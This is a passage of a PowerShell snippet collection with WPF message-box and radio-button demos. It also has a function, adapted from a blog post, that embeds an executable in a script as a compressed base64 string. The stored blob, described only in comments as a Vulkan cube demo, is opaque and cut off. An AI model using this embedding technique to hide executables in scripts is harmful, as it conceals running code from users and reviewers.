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
AABJRU5ErkJggg==
'
$CustomImage = New-Object System.Windows.Media.Imaging.BitmapImage
$CustomImage.BeginInit()
$CustomImage.StreamSource = [System.IO.MemoryStream][System.Convert]::FromBase64String($Base64)
$CustomImage.EndInit()

$Image = New-Object System.Windows.Controls.Image
$Image.Source = $CustomImage
$Image.Height = 512 #[System.Drawing.Image]::FromFile($CustomImage).Height / 2
$Image.Width = 512 #[System.Drawing.Image]::FromFile($CustomImage).Width / 2
 
$TextBlock = New-Object System.Windows.Controls.TextBlock
$TextBlock.Text = "My Logo"
$TextBlock.FontSize = "28"
$TextBlock.HorizontalAlignment = "Center"
 
$StackPanel = New-Object System.Windows.Controls.StackPanel
$StackPanel.AddChild($Image)
$StackPanel.AddChild($TextBlock)
 
New-WPFMessageBox -Content $StackPanel -Title "Messagebox with some logo" -TitleBackground LightSeaGreen -TitleTextForeground Black -ContentBackground LightSeaGreen

$ComputerName = "RandomPC"
Try
{
    New-PSSession -ComputerName $ComputerName -ErrorAction Stop
}
Catch
{
 
    # Create a text box
    $TextBox = New-Object System.Windows.Controls.TextBox
    $TextBox.Text = "Could not create a remote session to '$ComputerName'!"
    $TextBox.Padding = 5
    $TextBox.Margin = 5
    $TextBox.BorderThickness = 0
    $TextBox.FontSize = 16
    $TextBox.Width = "NaN"
    $TextBox.IsReadOnly = $True
 
    # Create an exander
    $Expander = New-Object System.Windows.Controls.Expander
    $Expander.Header = "Error details"
    $Expander.FontSize = 14
    $Expander.Padding = 5
    $Expander.Margin = "5,5,5,0"
 
    # Bind the expander width to the text box width, so the message box width does not change when expanded
    $Binding = New-Object System.Windows.Data.Binding
    $Binding.Path = [System.Windows.Controls.TextBox]::ActualWidthProperty
    $Binding.Mode = [System.Windows.Data.BindingMode]::OneWay
    $Binding.Source = $TextBox
    [void]$Expander.SetBinding([System.Windows.Controls.Expander]::WidthProperty,$Binding)
 
    # Create a textbox for the expander
    $ExpanderTextBox = New-Object System.Windows.Controls.TextBox
    $ExpanderTextBox.Text = "$_"
    $ExpanderTextBox.Padding = 5
    $ExpanderTextBox.BorderThickness = 0
    $ExpanderTextBox.FontSize = 16
    $ExpanderTextBox.TextWrapping = "Wrap"
    $ExpanderTextBox.IsReadOnly = $True
    $Expander.Content = $ExpanderTextBox
 
    # Assemble controls into a stackpanel
    $StackPanel = New-Object System.Windows.Controls.StackPanel
    $StackPanel.AddChild($TextBox)
    $StackPanel.AddChild($Expander)
 
    # Using no rounded corners as they do not stay true when the window resizes
    New-WPFMessageBox -Content $StackPanel -Title "PSSession Error" -TitleBackground Red -TitleFontSize 20 <# -Sound 'Windows Unlock' #> -CornerRadius 0



$Params = @{
    FontFamily = 'Arial'
    Title = ":("
    TitleFontSize = 80
    TitleTextForeground = 'White'
    TitleBackground = 'SteelBlue'
    ButtonType = 'OK'
    ContentFontSize = 16
    ContentTextForeground = 'White'
    ContentBackground = 'SteelBlue'
    ButtonTextForeground = 'White'
    BorderThickness = 0
}
New-WPFMessageBox @Params -Content "The script ran into a problem that it couldn't handle, and now it needs to exit. 
 
0x80050002

 See https://smsagent.wordpress.com/2017/08/24/a-customisable-wpf-messagebox-for-powershell/ for more exmaples"


}
}

function func_wpf_routedevents2
{
#https://learn-powershell.net/2014/08/10/powershell-and-wpf-radio-button/

#https://gist.githubusercontent.com/SMSAgentSoftware/8331a70fac978e4c998bbc8fe34094bb/raw/88c2e4e7850cfd5177f76751f9b13cfc21db840e/New-CustomToastNotification.ps1

#Build the GUI
[xml]$xaml = @"
<Window 
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    x:Name="Window" Title="Initial Window" WindowStartupLocation = "CenterScreen"
    SizeToContent = "WidthAndHeight" ShowInTaskbar = "True" Background = "red"> 
    <StackPanel x:Name='StackPanel'> 
        <RadioButton x:Name="Item1" Content = 'Item1'/>
        <RadioButton x:Name="Item2" Content = 'Item2'/>
        <RadioButton x:Name="Item3" Content = 'Item3'/>  
        <Separator/>
        <TextBox x:Name='textbox'/>      
    </StackPanel>
</Window>
"@
 
$reader=(New-Object System.Xml.XmlNodeReader $xaml)
$Window=[Windows.Markup.XamlReader]::Load( $reader )

$xaml.SelectNodes("//*[@*[contains(translate(name(.),'n','N'),'Name')]]") | ForEach {
    Set-Variable -Name ($_.Name) -Value $Window.FindName($_.Name) -Scope Script
}

#Bubble up event handler
[System.Windows.RoutedEventHandler]$Script:CheckedEventHandler = {
    $TextBox.Text = $_.source.name
}
$StackPanel.AddHandler([System.Windows.Controls.RadioButton]::CheckedEvent, $CheckedEventHandler)

$Window.Showdialog() | Out-Null
}

function func_embed-exe-in-psscript2
{
#https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts/

#Adapted a few lines so that it runs in PowerShell Core, search for lines that start with comment "ADAPTED TO PS7"

#Only works for 64-bit executables as only 64-bit pwsh.exe is installed....

#usage: wine powershell -f embedding-exe-files-into-powershell-scripts-example_vkcube.exe.ps1



function Convert-BinaryToString {
 
   [CmdletBinding()] param (
 
      [string] $FilePath
 
   )
 
   try {
 
      $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
 
   }
 
   catch {
 
      throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";
 
   }
 
   if ($ByteArray) {
 
      $Base64String = [System.Convert]::ToBase64String($ByteArray);
 
   }
 
   else {
 
      throw '$ByteArray is $null.';
 
   }
 
   Write-Output -InputObject $Base64String;
 
}
 # Below vkcube.exe as a Base64 encoded string; Included copyright below:
 # compiled for smaller size (after choco install mingw and choco install vulkan-sdk) with gcc -s -Os -fno-ident -fno-stack-protector -fomit-frame-pointer -fno-unwind-tables -fno-asynchronous-unwind-tables -falign-functions=1  -mpreferred-stack-boundary=4 -falign-jumps=1 -falign-loops=1 -I"..\Include"  .\cube.c "..\Lib\vulkan-1.lib" -lgdi32
 # and added two extra lines to cube.c : #define VK_USE_PLATFORM_WIN32_KHR and #define NDEBUG
 # Copyright (c) 2015-2019 The Khronos Group Inc.
 # Copyright (c) 2015-2019 Valve Corporation
 # Copyright (c) 2015-2019 LunarG, Inc.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
 # you may not use this file except in compliance with the License.
 # You may obtain a copy of the License at
 #
 #     http://www.apache.org/licenses/LICENSE-2.0
 #
 # Unless required by applicable law or agreed to in writing, software
 # distributed under the License is distributed on an "AS IS" BASIS,
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
 #
 # Author: Jeremy Hayes <jeremy@lunarg.com>
 # Author: Charles Giessen <charles@lunarg.com>


#Compress Base64-string:

#$InputString='any uncompressed base64 string...'

#Compress Base64-string:

#$MemoryStream = [System.IO.MemoryStream]::new()
#$Compressor = [System.IO.Compression.GZipStream]::new($MemoryStream,[System.IO.Compression.CompressionMode]::Compress,3)
#$CompressionWriter = [System.IO.StreamWriter]::new($Compressor)
#$CompressionWriter.Write($InputString)
#$CompressionWriter.Close()

#[System.Convert]::ToBase64String($MemoryStream.ToArray())

# format later with unix fold for nicer output (120 char. width)

$CompressedString='
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
